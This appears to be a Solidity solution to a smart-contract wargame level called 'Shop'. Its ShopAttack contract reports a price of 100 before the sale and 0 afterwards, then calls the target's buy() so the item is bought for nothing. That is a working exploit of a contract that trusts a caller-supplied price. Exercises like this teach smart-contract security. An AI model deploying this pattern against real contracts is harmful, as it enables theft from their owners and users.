// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Shop.sol";

contract ShopAttack{
    Shop sh;
    constructor(address addr){
        sh = Shop(addr);
    }
    function price() external view returns (uint){
        if(sh.isSold() == false){
            return 100;
        }else{
            return 0;
        }
    }
    function att() public {
        sh.buy();
    }
}